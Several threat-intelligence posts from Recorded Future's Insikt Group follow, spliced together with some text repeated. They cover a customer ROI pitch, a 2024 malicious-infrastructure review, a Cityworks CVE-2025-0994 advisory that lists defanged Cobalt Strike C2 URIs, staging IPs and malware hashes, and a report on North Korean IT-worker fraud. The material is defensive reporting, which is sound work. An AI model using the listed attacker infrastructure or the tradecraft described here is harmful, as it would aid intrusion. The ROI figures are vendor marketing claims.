Business-Centric Security Priorities</h3>\n        <p>Begin by identifying your organization's \"crown jewels\"—the critical assets, data, and operations that would cause significant harm if compromised. This is a fundamental principle of business risk management. Work with business leadership to understand what matters most to the organization's success and prioritize security efforts accordingly.</p>\n        <h3>2. Assess Threats in Business Context</h3>\n        <p>Not all vulnerabilities will be exploited, and not all threats pose an immediate risk to your specific organization. Use threat intelligence to focus first on responding to the threats that present actual risk to your people, assets, and business objectives.</p>\n        <h3>3. Leverage Automation to Increase Efficiency</h3>\n        <p>With proper automation, security teams can dramatically reduce manual effort while improving response times. By automating routine tasks like alert enrichment and correlation, analysts can focus on strategic threat hunting and proactive security initiatives.</p>\n        <h3>4. Measure and Communicate Business Impact</h3>\n        <p>Track and report on security metrics that matter to business leaders, such as:</p>\n        <ul>\n          <li>Reduced cyber insurance premiums</li>\n          <li>Avoided fraud losses</li>\n          <li>Increased uptime</li>\n          <li>Accelerated response times</li>\n          <li>Brand protection efforts</li>\n        </ul>\n        <h3>5. Mature Your Program Over Time</h3>\n        <p>As your threat intelligence program matures, continuously refine your approach to address evolving business needs and emerging threats. This might include expanding monitoring to new digital channels, deepening integration with business systems, or enhancing threat hunting capabilities.</p>\n        <h2>Conclusion: Protecting Business Continuity Through Cyber Risk Reduction</h2>\n        <p>The data is clear: By implementing comprehensive threat intelligence from Recorded Future, organizations can not only prevent security incidents but also demonstrate tangible ROI through business risk reduction.</p>\n        <p>With 57% of customers reporting that Recorded Future has significantly reduced their organization's overall cyber risk, the platform has proven its ability to deliver meaningful business impact. From protecting brand reputation and reducing cyber insurance premiums to preventing downtime and fraud losses, threat intelligence serves as a foundational element of business resilience.</p>\n        <p>In today's threat landscape, organizations that understand the business value of cybersecurity will maintain competitive advantage through stronger customer trust, operational resilience, and financial stability. By using threat intelligence to reduce risk strategically, security leaders can position their teams as essential contributors to business success rather than cost centers.</p>\n        <p>The message for business and security leaders is clear: investing in comprehensive threat intelligence isn't just a security requirement—it's a business imperative with measurable returns.</p>\n        <h2>Discover the Full Impact</h2>\n        <p>Want to learn more about how threat intelligence can protect your brand, reduce costs, and strengthen your business? <a href=\"https://go.recordedfuture.com/report/how-recorded-future-drives-roi\">Download the complete 2025 Recorded Future ROI Report</a> to explore detailed metrics on both business impact and team productivity improvements.</p>\n        <p><em>Research methodology: UserEvidence conducted two distinct surveys with Recorded Future customers (117 participants in July 2024 and over 170 participants in November 2024) to collect quantitative ROI data and qualitative feedback.

When systems go offline due to ransomware or distributed denial-of-service (DDoS) attacks, every minute of downtime translates to financial impact.\nOur customers report that threat intelligence from Recorded Future helps minimize downtime, which for a billion-dollar organization translates to an average revenue value of approximately $19,025 per month—or nearly $230,000 annually. This calculation doesn't even account for the additional benefit of avoiding reputational damage that inevitably accompanies service disruptions.\n“Recorded Future allows us to shift our mindset from being more reactive in nature to being more proactive and responsive to threats that went unnoticed in the past. This, in turn, has facilitated the development of new processes that have enhanced the overall security posture of the business,\" explains a Lead Cyber Defense Engineer at a major food and staples retailing company.\nFraud Prevention\nPayment fraud, transaction fraud, and billing schemes represent significant financial threats to businesses across industries. Through comprehensive threat intelligence, organizations can identify and mitigate these risks before they materialize into actual losses.\nRecorded Future’s threat intelligence helps customers reduce fraud losses. A billion-dollar business that loses $500,000 annually to payment fraud losses would recover over $6,812 per month through improved threat intelligence with Recorded Future. Outside of the payments themselves, fraud loss mitigation also contributes financially by strengthening the integrity and trustworthiness of your business.\nAs one customer, a Senior Information Security Analyst at Jefferson Bank, noted: \"We use Recorded Future's dark web intelligence to proactively stop attacks, reset weak passwords, or prevent bank card fraud. This has a potential savings of $1,000-2,000 depending on the customer or situation.\"\nAll Together: The ROI of Business and Brand Risk Reduction with Recorded Future\nAcross all risk reduction areas, customers can save approximately $31,000 monthly—or $371,000 yearly.\nThis substantial return breaks down into several key components:\n$2,602 monthly from brand reputation protection\n$2,497 monthly from reduced cyber insurance premiums\n$19,025 monthly from downtime avoidance/increased uptime\n$6,812 monthly from fraud loss prevention\nTogether, these savings represent a 209.4% ROI on business risk reduction alone. When combined with the productivity improvements that threat intelligence enables (an additional 141.9% ROI), Recorded Future customers achieve a total of 351.3% ROI annually.\nImplementing a Proactive Cybersecurity Strategy\nTo realize the full business impact of threat intelligence, organizations should follow a structured approach to implementation:\n1. Define Business-Centric Security Priorities\nBegin by identifying your organization's \"crown jewels\"—the critical assets, data, and operations that would cause significant harm if compromised. This is a fundamental principle of business risk management. Work with business leadership to understand what matters most to the organization's success and prioritize security efforts accordingly.\n2. Assess Threats in Business Context\nNot all vulnerabilities will be exploited, and not all threats pose an immediate risk to your specific organization. Use threat intelligence to focus first on responding to the threats that present actual risk to your people, assets, and business objectives.\n3. Leverage Automation to Increase Efficiency\nWith proper automation, security teams can dramatically reduce manual effort while improving response times. By automating routine tasks like alert enrichment and correlation, analysts can focus on strategic threat hunting and proactive security initiatives.\n4. Measure and Communicate Business Impact\nTrack and report on security metrics that matter to business leaders, such as:\nReduced cyber insurance premiums\nAvoided fraud losses\nIncreased uptime\nAccelerated response times\nBrand protection efforts\n5. Mature Your Program Over Time\nAs your threat intelligence program matures, continuously refine your approach to address evolving business needs and emerging threats. This might include expanding monitoring to new digital channels, deepening integration with business systems, or enhancing threat hunting capabilities.\nConclusion: Protecting Business Continuity Through Cyber Risk Reduction\nThe data is clear: By implementing comprehensive threat intelligence from Recorded Future, organizations can not only prevent security incidents but also demonstrate tangible ROI through business risk reduction.\nWith 57% of customers reporting that Recorded Future has significantly reduced their organization's overall cyber risk, the platform has proven its ability to deliver meaningful business impact. From protecting brand reputation and reducing cyber insurance premiums to preventing downtime and fraud losses, threat intelligence serves as a foundational element of business resilience.\nIn today's threat landscape, organizations that understand the business value of cybersecurity will maintain competitive advantage through stronger customer trust, operational resilience, and financial stability. By using threat intelligence to reduce risk strategically, security leaders can position their teams as essential contributors to business success rather than cost centers.\nThe message for business and security leaders is clear: investing in comprehensive threat intelligence isn't just a security requirement—it's a business imperative with measurable returns.\nDiscover the Full Impact\nWant to learn more about how threat intelligence can protect your brand, reduce costs, and strengthen your business?

While many key 2023 trends persisted — such as Cobalt Strike dominating offensive security tools (OSTs), AsyncRAT and QuasarRAT leading among remote access trojans (RATs), China and the United States (US) being the top hosting locations, and law enforcement actions having often only temporary impact — Insikt Group identified several emerging trends in 2024.</p>\n        <p>Notably, malware-as-a-service (MaaS) infostealers, led by LummaC2, grew in prevalence, likely driven by law enforcement actions against competitor infostealers and rapid innovation by LummaC2. Additionally, Android remained the primary target for mobile malware, with Hook leading. While Latrodectus dominated droppers and loaders despite law enforcement disruptions in the loader ecosystem, traffic distribution systems (TDSs) continued to enhance cybercrime efficiency, as seen with TAG-124, and the abuse of content delivery networks (CDNs) like Cloudflare surged. In regards to state-sponsored groups, China notably increased its use of relay networks such as ArcSilt, while Russia continued its abuse of a wide range of <a href=\"/research/threat-actors-leverage-internet-services-to-enhance-data-theft-and-weaken-security-defenses\">legitimate internet services (LIS)</a>.</p>\n        <p>Defenders should leverage this report's insights to strengthen security controls by prioritizing top malware and infrastructure techniques, and thereby enhance network monitoring and deploy relevant detections like YARA, Sigma, and Snort. This should be complemented by investments in tracking evolving malicious infrastructure dynamics, conducting threat simulations to test defenses, and effectively monitoring the broader threat landscape. Regarding LIS, defenders must balance blocking, flagging, or allowing high-risk services based on their assessed criticality and risk level.</p>\n        <p>As malicious infrastructure evolves and detection improves, Insikt Group expects existing trends to persist in 2025, driven by continuous threat actor innovation rather than drastic shifts. For example, the \"as-a-service\" ecosystem will likely expand, and threat actors will increasingly rely on legitimate tools, services, and CDNs to evade detection. Furthermore, with growing mobile reliance, Insikt Group expects mobile-based threats to continue to rise. Relay networks, primarily used by Chinese state-sponsored groups up until now, may see broader adoption by cybercriminals and other state-sponsored groups. Lastly, law enforcement actions are expected to have a greater impact due to enhanced international cooperation and accrued expertise in large-scale cybercrime takedowns.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>MaaS infostealers led in infections in 2024, with LummaC2 dominating command-and-control (C2) servers as continuous innovation and law enforcement actions against rivals like RedLine Stealer reshaped the cybercrime ecosystem.</li>\n          <li>AsyncRAT and Quasar RAT remained the top remote access tools (RATs), while MaaS-based malware like DcRAT continued widespread use.</li>\n          <li>The US (North America), Brazil (South America), Angola (Africa), France (Europe), India (Asia), and Australia (Oceania) recorded the highest number of victims in their respective regions based on Recorded Future Network Intelligence, with AsyncRAT emerging as the most prevalent malware in most cases. Other significant threats included QuasarRAT and Cobalt Strike.</li>\n          <li>Android remained the primary target for mobile malware, with nine of the top ten families focusing on it, alongside the rise of mercenary spyware and potentially unwanted programs (PUPs) like stalkerware.</li>\n          <li>Cobalt Strike accounted for two-thirds of offensive security tool command-and-control (C2) servers, with jQuery as the most popular malleable profile and cs2modrewrite targeting the most victim countries. Cobalt Strike is followed by Metasploit, with detections of Sliver and Brute Ratel C4 rising significantly.</li>\n          <li>Mozi Botnet was the largest tracked botnet in 2024 based on the number of identified bots, while older botnets remained active, being primarily used for distributed denial-of-service (DDoS) attacks, as well as credential theft and localized attacks, as seen with Fenix Botnet.</li>\n          <li>Latrodectus dominated all droppers and loaders in 2024, accounting for 33% of detections, likely driven by law enforcement disruptions in the loader ecosystem, while most top families emerged post-2021, indicating shorter lifespans.</li>\n          <li>TDS continued to play a crucial role in cybercrime by improving efficiency, targeting, and profitability while evading detection, exemplified by TAG-124, which served a broad user base, including ransomware groups like Rhysida.</li>\n          <li>The US and China dominated malicious hosting, while bulletproof hosting providers like Stark Industries played a growing role in cybercrime infrastructure.</li>\n          <li>Chinese state-sponsored groups expanded their use of anonymization networks in 2024 to target entities worldwide, enabling them to blend with legitimate traffic and complicate victim identification, while RedDelta used Cloudflare to proxy C2 traffic and geo-fence malicious files.</li>\n          <li>Russian state-sponsored groups increasingly relied on legitimate services like Ngrok, Cloudflare, and Telegram to evade detection, with BlueDelta shifting to Ngrok after takedown efforts and BlueAlpha using Cloudflare Tunnels to stage GammaDrop malware.</li>\n        </ul>\n        <h2>Introduction</h2>\n        <p>Insikt Group proactively identifies and monitors infrastructure associated with hundreds of malware families, threat actors, and other artifacts, including phishing kits, scanners, and relay networks. By automatically validating malicious infrastructure through various proprietary methods on a daily basis, Insikt Group provides accurate risk representation, enabling Recorded Future customers to enhance their detection and defense capabilities.</p>\n        <p>Building on Insikt Group's annual adversary infrastructure reports from <a href=\"/research/2022-adversary-infrastructure-report\">2022</a> and <a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2024-1209.pdf\">2023</a>, the 2024 Malicious Infrastructure Report provides a concise, data-based overview of malicious infrastructure observed throughout 2024. This year, it specifically emphasizes the synergy among passive infrastructure detection, higher-tier infrastructure insights powered by Recorded Future Network Intelligence, and victim identification. Overall, this report is for anyone interested in malicious infrastructure, offering a high-level overview of its current state as well as summaries of key findings to inform decision-making and provide a broad perspective in this highly dynamic environment.</p>\n        <p>Recognizing the challenge of categorizing malware types in a mutually exclusive manner due to their overlapping functionalities, this report establishes a set of malware categories to facilitate analysis, as detailed in <strong>Appendix A</strong>, with brief definitions for each. Notably, certain malware categories, such as crypters, have been intentionally excluded due to the usual absence of network artifacts.</p>\n        <p>Beyond examining malicious infrastructure through the lens of malware categories, Insikt Group also monitors it by type, with each type assigned a distinct risk scoring within the Recorded Future Intelligence Cloud. This differentiation reflects varying levels of severity — for instance, network traffic to or from a C2 server in a corporate network may indicate higher risk compared to a management panel, as it typically implies active malicious activity.

In North America, the US is the most targeted country, accounting for around 87% of unique victims in the region despite making up only about half of its population. The high victim count in the US is likely driven by factors such as its large population, extensive digital footprint, widespread English use (exploited in phishing campaigns), and economics, while also being influenced by the country's role as a global infrastructure hub, providing hosting and digital services to organizations worldwide. Most victims are linked to AsyncRAT, followed by SolarMarker RAT and QuasarRAT (see <strong>Table 1</strong>).

","content:encodedSnippet":"Executive Summary\nIn 2024, Insikt Group significantly expanded its tracking of malicious infrastructure by covering more malware families and categories, additional infrastructure types such as staging servers, and integrating data sources like Recorded Future® Network Intelligence, enhancing threat detection, higher-tier infrastructure insights, and victimology analysis. While many key 2023 trends persisted — such as Cobalt Strike dominating offensive security tools (OSTs), AsyncRAT and QuasarRAT leading among remote access trojans (RATs), China and the United States (US) being the top hosting locations, and law enforcement actions having often only temporary impact — Insikt Group identified several emerging trends in 2024.\nNotably, malware-as-a-service (MaaS) infostealers, led by LummaC2, grew in prevalence, likely driven by law enforcement actions against competitor infostealers and rapid innovation by LummaC2. Additionally, Android remained the primary target for mobile malware, with Hook leading. While Latrodectus dominated droppers and loaders despite law enforcement disruptions in the loader ecosystem, traffic distribution systems (TDSs) continued to enhance cybercrime efficiency, as seen with TAG-124, and the abuse of content delivery networks (CDNs) like Cloudflare surged. In regards to state-sponsored groups, China notably increased its use of relay networks such as ArcSilt, while Russia continued its abuse of a wide range of legitimate internet services (LIS).\nDefenders should leverage this report's insights to strengthen security controls by prioritizing top malware and infrastructure techniques, and thereby enhance network monitoring and deploy relevant detections like YARA, Sigma, and Snort. This should be complemented by investments in tracking evolving malicious infrastructure dynamics, conducting threat simulations to test defenses, and effectively monitoring the broader threat landscape. Regarding LIS, defenders must balance blocking, flagging, or allowing high-risk services based on their assessed criticality and risk level.\nAs malicious infrastructure evolves and detection improves, Insikt Group expects existing trends to persist in 2025, driven by continuous threat actor innovation rather than drastic shifts. For example, the \"as-a-service\" ecosystem will likely expand, and threat actors will increasingly rely on legitimate tools, services, and CDNs to evade detection. Furthermore, with growing mobile reliance, Insikt Group expects mobile-based threats to continue to rise. Relay networks, primarily used by Chinese state-sponsored groups up until now, may see broader adoption by cybercriminals and other state-sponsored groups. Lastly, law enforcement actions are expected to have a greater impact due to enhanced international cooperation and accrued expertise in large-scale cybercrime takedowns.\nKey Findings\nMaaS infostealers led in infections in 2024, with LummaC2 dominating command-and-control (C2) servers as continuous innovation and law enforcement actions against rivals like RedLine Stealer reshaped the cybercrime ecosystem.\nAsyncRAT and Quasar RAT remained the top remote access tools (RATs), while MaaS-based malware like DcRAT continued widespread use.\nThe US (North America), Brazil (South America), Angola (Africa), France (Europe), India (Asia), and Australia (Oceania) recorded the highest number of victims in their respective regions based on Recorded Future Network Intelligence, with AsyncRAT emerging as the most prevalent malware in most cases. Other significant threats included QuasarRAT and Cobalt Strike.\nAndroid remained the primary target for mobile malware, with nine of the top ten families focusing on it, alongside the rise of mercenary spyware and potentially unwanted programs (PUPs) like stalkerware.\nCobalt Strike accounted for two-thirds of offensive security tool command-and-control (C2) servers, with jQuery as the most popular malleable profile and cs2modrewrite targeting the most victim countries. Cobalt Strike is followed by Metasploit, with detections of Sliver and Brute Ratel C4 rising significantly.\nMozi Botnet was the largest tracked botnet in 2024 based on the number of identified bots, while older botnets remained active, being primarily used for distributed denial-of-service (DDoS) attacks, as well as credential theft and localized attacks, as seen with Fenix Botnet.\nLatrodectus dominated all droppers and loaders in 2024, accounting for 33% of detections, likely driven by law enforcement disruptions in the loader ecosystem, while most top families emerged post-2021, indicating shorter lifespans.\nTDS continued to play a crucial role in cybercrime by improving efficiency, targeting, and profitability while evading detection, exemplified by TAG-124, which served a broad user base, including ransomware groups like Rhysida.\nThe US and China dominated malicious hosting, while bulletproof hosting providers like Stark Industries played a growing role in cybercrime infrastructure.\nChinese state-sponsored groups expanded their use of anonymization networks in 2024 to target entities worldwide, enabling them to blend with legitimate traffic and complicate victim identification, while RedDelta used Cloudflare to proxy C2 traffic and geo-fence malicious files.\nRussian state-sponsored groups increasingly relied on legitimate services like Ngrok, Cloudflare, and Telegram to evade detection, with BlueDelta shifting to Ngrok after takedown efforts and BlueAlpha using Cloudflare Tunnels to stage GammaDrop malware.\nIntroduction\nInsikt Group proactively identifies and monitors infrastructure associated with hundreds of malware families, threat actors, and other artifacts, including phishing kits, scanners, and relay networks. By automatically validating malicious infrastructure through various proprietary methods on a daily basis, Insikt Group provides accurate risk representation, enabling Recorded Future customers to enhance their detection and defense capabilities.\nBuilding on Insikt Group's annual adversary infrastructure reports from 2022 and 2023, the 2024 Malicious Infrastructure Report provides a concise, data-based overview of malicious infrastructure observed throughout 2024. This year, it specifically emphasizes the synergy among passive infrastructure detection, higher-tier infrastructure insights powered by Recorded Future Network Intelligence, and victim identification. Overall, this report is for anyone interested in malicious infrastructure, offering a high-level overview of its current state as well as summaries of key findings to inform decision-making and provide a broad perspective in this highly dynamic environment.\nRecognizing the challenge of categorizing malware types in a mutually exclusive manner due to their overlapping functionalities, this report establishes a set of malware categories to facilitate analysis, as detailed in Appendix A, with brief definitions for each. Notably, certain malware categories, such as crypters, have been intentionally excluded due to the usual absence of network artifacts.\nBeyond examining malicious infrastructure through the lens of malware categories, Insikt Group also monitors it by type, with each type assigned a distinct risk scoring within the Recorded Future Intelligence Cloud. This differentiation reflects varying levels of severity — for instance, network traffic to or from a C2 server in a corporate network may indicate higher risk compared to a management panel, as it typically implies active malicious activity. The infrastructure types defined by Insikt Group are detailed in Appendix B.\n2024 Malicious Infrastructure Insights by the Numbers\nProactively identifying malicious infrastructure is a complex task shaped by various factors. In addition to the vast volume of data, each malware family, version, or infrastructure linked to specific threat actors often employs entirely unique setups. Detection becomes even more challenging due to factors such as hosting behind CDNs like Cloudflare, the use of high or random ports, reliance on legitimate internet services such as Discord or Telegram, or the exploitation of compromised infrastructure.\nThese setups also evolve continuously, demanding that Insikt Group constantly innovate and refine its tracking methodologies. Considering all these factors, this report examines malicious infrastructure across multiple categories, including infostealers, backdoors and RATs, mobile malware, OSTs, botnets, droppers and loaders, phishing kits, web shells, and ransomware.\nOverall, in 2024, there has been a significant rise in identified malicious infrastructure, driven by an evolving threat landscape and advancements in detection methodologies by Insikt Group. For instance, the number of unique, validated C2 servers doubled from 2023 to 2024, while unique, validated management panels saw a 69% increase over the same period.\nIn addition, using Recorded Future Network Intelligence, Insikt Group identified victims in approximately 200 countries worldwide in 2024 based on victim IP address geolocation. Countries in Figure 1 were categorized into five groups based on the number of unique victims detected, with those showing high exposure being geographically dispersed worldwide. Notably, accurately measuring malware impact across countries is challenging due to variations in population size, digital footprint, analytical biases (for example, the types of malware tracked), internet infrastructure (such as proxies), and the geographical hosting choices of victim organizations.\nFigure 1: Malware impact by country based on Recorded Future Network Intelligence (Source: Recorded Future)\nFigure 2 shows the distribution of victims by country across different continents. In North America, the US is the most targeted country, accounting for around 87% of unique victims in the region despite making up only about half of its population. The high victim count in the US is likely driven by factors such as its large population, extensive digital footprint, widespread English use (exploited in phishing campaigns), and economics, while also being influenced by the country's role as a global infrastructure hub, providing hosting and digital services to organizations worldwide. Most victims are linked to AsyncRAT, followed by SolarMarker RAT and QuasarRAT (see Table 1). Notably, unlike AsyncRAT and QuasarRAT, SolarMarker RAT is believed to be operated by a single threat actor and has previously been observed predominantly targeting the US.\nFigure 2: Shares of unique victim by country and continent (Source: Recorded Future)\nIn South America, Brazil recorded the highest number of unique victims, accounting for 86% of the region’s total, while also only making up around half of the continent’s population. Previously identified as one of the countries most vulnerable to cyberattacks, Brazil has long been a hotspot for both global and local cyber threats, ranking high in cybercrime activity, with groups like Grandoreiro operating almost exclusively within its borders. In 2024, QuasarRAT infections were the most prevalent among Brazilian victims, followed by infections linked to AsyncRAT and SectopRAT.\nIn Africa, Angola recorded the highest number of unique victims, followed by Ghana, South Africa, the Republic of the Congo, and the Democratic Republic of the Congo. Notably, in two of the five most targeted African countries, PlugX, a malware linked to multiple Chinese state-sponsored groups, ranked among the most prevalent malware.\nIn Europe, France had the highest number of unique victims, followed by Germany, the United Kingdom, the Netherlands, and Poland. AsyncRAT was the most prevalent malware across all five countries, with Cobalt Strike ranking second in three of them. The distribution of victims in these top five countries closely aligns with their population sizes. Notably, in the Netherlands, GobRAT — a backdoor targeting Linux routers with malware written in Go — ranked among the top three malware families.\nIn Asia, India recorded the highest number of unique victims, followed by China, Indonesia, Thailand, and Hong Kong.

The critical infrastructure sectors Cityworks services include water and wastewater systems, energy, transportation systems, government services and facilities, and communications.\nThe vulnerability affects Cityworks versions before 15.8.9 and Cityworks with Office Companion versions before 23.10.\nSuccessfully exploiting CVE-2025-0994 can allow authenticated attackers to conduct remote code execution (RCE) against a target’s Microsoft Internet Information Services (IIS) web server.\nFigure 1: Login page on an exposed Cityworks instance (Source: Recorded Future)\nInsikt Group’s Assessment of CVE-2025-0994\nIndicators of compromise (IoCs) shared by Trimble suggest that the vulnerability is being exploited to deliver custom Rust-based loaders capable of loading VShell and Cobalt Strike into memory. Additionally, the threat actors delivered an obfuscated JavaScript payload located in the “%TEMP%” folder, two unknown files, three malicious executables with randomized, alphanumeric filenames (for example, “fq1u4t83[.]exe”), and two files masquerading as legitimate services (“winpty.dll” and “winpty-agent[.]exe”).\nThe malicious files were likely downloaded into the victim's environment from threat actor-controlled Cobalt Strike C2 servers.\nBased on the IoCs shared by Trimble, the threat actors used 192.210.239[.]172:3219 and 192.210.239[.]172:4219 as staging infrastructure. Insikt Group has validated this IP address as a C2 server for Cobalt Strike.\nThere is insufficient evidence to definitively confirm which files were transferred from the threat actor’s infrastructure; however, the obfuscated alphanumeric-named executables stored in the “\\Temp” folder or the JavaScript payload are two possibilities.\nAt the time of writing, there were 111 exposed Cityworks instances on Shodan, 21% of which are vulnerable based on identified version numbers. The majority of exposed instances are also geolocated in the US and include multiple .gov domains.\nFigure 2: Nearly 95% of exposed Cityworks instances on Shodan are geolocated in the US (Sources: Shodan, Recorded Future)\nTrimble shared the following list of IoCs related to their observed exploitation of CVE-2025-0994:\nIoC\nType\nDescription\n4b7561e27c87a1895446d7f2b83e2d9fcf71e6d6e8bc99d44818dc39a6ff99d5\nSHA-256\nObfuscated JavaScript payload\n4ffc33bdc8527a2e8cb87e49cdc16c3b1480dfc135e507d552f581a67d1850a9\nSHA-256\nVShell loader\n8a6c735f3608719ec9f46d9c6c5fc196db8c97065957c218b98733a491edd899\nSHA-256\nUnknown\n883d849b94238c26c57c0595ccb95b8c356628887b9a3628bf56e726332af925\nSHA-256\nCobalt Strike loader\n151a71c43e63db802d41d5d715aa98eb1b236e0a6441076a8d30fd93990416b4\nSHA-256\nUnknown\n1de72c03927bcd2810ce98205ff871ef1ebf4344fba187e126e50caa1e43250b\nSHA-256\nCobalt Strike loader\n14a072113baa0a1e1e2b6044068c7bc972ae5e541a0aec06577b0d6663140079\nSHA-256\nUnknown malicious file fq1u4t83[.]exe\n04dc3a16e1e2b4924943805a1cea5e402c4f2304c717ea21fdf43274b8c34a84\nSHA-256\nUnknown malicious file q0pe6x96[.]exe\nf09b51b759dfe7de06fa724bd89592f5b8eae57053d5fb4891e40f24055103fb\nSHA-256\nUnknown malicious file szm9wz8m[.]exe\nC:\\windows\\temp\\z1[.]exe\nFile path\nMalicious binary download path\nC:\\windows\\temp\\z2[.]exe\nFile path\nMalicious binary download path\nC:\\windows\\temp\\z44[.]exe\nFile path\nMalicious binary download path\nC:\\windows\\temp\\z55[.]exe\nFile path\nMalicious binary download path\nC:\\Windows\\Temp\\UDGEZR[.]exe\nFile path\nMalicious binary download path\nC:\\Windows\\Temp\\z55.exe_winpty\\winpty-agent[.]exe\nFile path\nPUTTY binary download path\nC:\\Windows\\Temp\\z55.exe_winpty\\winpty[.]dll\nFile path\nPUTTY binary download path\n192.210.239[.]172:3219\nIPv4:port\nStaging IP address\n192.210.239[.]172:4219\nIPv4:port\nStaging IP address\n23.247.136[.]238\nIPv4\nThreat actor-controlled IP address\n31.59.70[.]13\nIPv4\nThreat actor-controlled IP address\n31.59.70[.]11\nIPv4\nThreat actor-controlled IP address\n149.112.117[.]49\nIPv4\nThreat actor-controlled IP address\n192.210.137[.]81\nIPv4\nThreat actor-controlled IP address\n192.210.183[.]118\nIPv4\nThreat actor-controlled IP address\ncdn.phototagx[.]com\nDomain\nThreat actor-controlled callback domain\nifode[.]xyz\nDomain\nThreat actor-controlled domain\nhttps[:]//cdn.lgaircon[.]xyz[:]443/jquery-3.3.1.min.js\nURI\nCobalt Strike C2\nhttps[:]//192.210.239[.]172/messages/73KWf-o0-s0hxVCDJp1sfAHRcgdm7\nURI\nCobalt Strike C2\nTable 1: IoCs shared by Trimble related to their observed exploitation of CVE-2025-0994 (Source: Trimble)\nRecommended Actions\nOrganizations should upgrade to Cityworks version 15.8.9 or later, and Cityworks with Office Companion version 23.10 or later.

North Korean IT workers infiltrate international companies and secure remote positions under false identities. These operatives not only violate international sanctions but also pose severe cybersecurity threats, engaging in fraud and data theft and potentially disrupting business operations.</p>\n        <p>Beyond financial fraud, these IT workers have been linked to cyber espionage. Insikt Group tracks PurpleBravo (formerly Threat Activity Group 120 [TAG-120]), a North Korean-linked cluster that overlaps with the “Contagious Interview” campaign, which primarily targets software developers in the cryptocurrency industry. The campaign employs malware such as BeaverTail, an infostealer that gathers sensitive information; InvisibleFerret, a cross-platform Python backdoor; and OtterCookie, a tool used to establish persistent access on compromised systems. At least three organizations in the broader cryptocurrency space were targeted by PurpleBravo between October and November 2024: a market-making company, an online casino, and a software development company.</p>\n        <p>The findings also highlight North Korea’s expansion into other areas of fraud, with the establishment of front companies that mimic legitimate IT firms. TAG-121, a separate cluster of activity, has been identified as operating a network of these companies across China. Each front company spoofs a different legitimate organization by copying large parts of their website. These entities create an added layer of deniability and make detection more challenging, allowing North Korean actors to further embed themselves in global IT supply chains.</p>\n        <p>The implications of this threat are far-reaching. Organizations that unknowingly hire North Korean IT workers may be in violation of international sanctions, exposing themselves to legal and financial repercussions. More critically, these workers almost certainly act as insider threats, stealing proprietary information, introducing backdoors, or facilitating larger cyber operations. Given North Korea’s history of financial theft, the risks extend beyond individual companies to the broader global financial system and national security interests.</p>\n        <p>To mitigate these threats, organizations must adopt stringent identity verification measures, ensuring that remote hires undergo thorough screening. This includes requiring video interviews, notarized identification documents, and continuous monitoring of remote workers for anomalies. Employers should also implement technical controls to detect unauthorized access, restrict data exposure, and flag suspicious remote connections. Awareness and training for human resources (HR) teams and IT security personnel are essential in preventing these actors from infiltrating critical business operations.</p>\n        <p>While the threat posed by North Korean IT workers is a fraud issue, it is also a key component of a sophisticated cyber strategy that financially sustains an internationally sanctioned regime. As these operations continue to evolve, businesses, governments, and cybersecurity organizations must work together to close the gaps that enable North Korea to exploit the remote work environment.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>North Korea’s use of IT workers to secure fraudulent employment and execute coordinated cyber campaigns highlights its evolving tactics to fund its military programs while undermining global intellectual property security.</li>\n          <li>Insikt Group assesses that PurpleBravo has targeted at least seven entities, three of which are in the cryptocurrency sector, including a market-making firm, an online casino, and a software company.</li>\n          <li>Insikt Group found evidence that PurpleBravo uses Astrill VPN to manage its command-and-control (C2) servers.</li>\n          <li>PurpleBravo was found posting job advertisements on at least three hiring websites, Telegram, and GitHub.</li>\n          <li>Insikt Group identified at least seven suspected North Korean-linked front companies operating in China spoofing legitimate IT firms in China, India, Pakistan, Ukraine, and the United States (US).</li>\n          <li>Organizations should implement robust technical safeguards, such as, where feasible, disabling remote desktop software, conducting regular checks of open ports across networks, deploying insider threat monitoring, and geolocating devices.</li>\n          <li>Insikt Group expects to continue to see groups like PurpleBravo and TAG-121 exploit the remote work environment, threatening global IT supply chains and intellectual property.</li>\n          <li>North Korea’s shift toward fraudulent remote employment and front companies will likely outpace traditional hiring protocol checks, driving organizations and governments to adopt more rigorous identity verification, enhanced remote work security, and robust international intelligence-sharing to counter this expanding threat.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>On January 23, 2025, the US Department of Justice (US DOJ) <a href=\"https://www.justice.gov/opa/pr/two-north-korean-nationals-and-three-facilitators-indicted-multi-year-fraudulent-remote\">indicted</a> two North Korean nationals and three facilitators for remote worker fraud that enriched the North Korean regime. In the indictment, the US DOJ described a six-year scheme in which two US citizens and one Mexican national conspired with North Korean IT workers to remotely work for at least 64 US companies. Payments from ten companies generated at least $866,255 in revenue that was laundered through a Chinese bank account. In addition to the indictment, stories of organizations and individuals that have come across North Korean IT workers can be regularly found in open sources (<a href=\"https://x.com/zachxbt/status/1824047425822310580\">1</a>, <a href=\"https://sohay666.github.io/article/en/reversing-scam-interview-base-on-js-project.html\">2</a>, <a href=\"https://www.knowbe4.com/press/knowbe4-issues-warning-to-organizations-after-hiring-fake-north-korean-employee\">3</a>). Besides sanctions violations, the threat from these workers, whether stealing sensitive data or installing malware on internal systems, presents unique challenges to organizations, especially in remote work environments.</p>\n        <p>North Korea remains highly isolated from the outside world due to the regime’s strict control over goods, people, and information, as well as international sanctions placed upon the country. Despite this, Pyongyang’s leadership is <a href=\"/research/north-korea-internet-activity\">well-versed</a> in exploiting emerging technologies to fund its operations. As sanctions have tightened, the regime <a href=\"/research/north-korea-cyber-activity\">adapted</a> by escalating illicit activities, including smuggling and cybercrime. In recent years, the regime has achieved significant <a href=\"/research/crypto-country-north-koreas-targeting-cryptocurrency\">success</a> in stealing from traditional financial institutions and digital assets like cryptocurrency. Between 2020 and 2024, the rise of remote work created new opportunities for North Korea to deploy skilled IT workers who infiltrate global companies under false identities. Their activities directly support the regime’s military programs while posing a significant threat to industries reliant on intellectual property.</p>\n        <p>Research into North Korean IT workers has focused on the following aspects of the threat: North Korean IT workers gaining fraudulent <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat\">employment</a> through proxies; North Korean <a href=\"https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/\">front companies</a>, often in the software development space, imitating legitimate organizations; and <a href=\"https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west\">fake</a> employment opportunities targeting software developers in cryptocurrency and AI, among other industries. Other research has established <a href=\"https://unit42.paloaltonetworks.com/fake-north-korean-it-worker-activity-cluster/\">links</a> between IT workers and ongoing malicious campaigns by North Korean threat 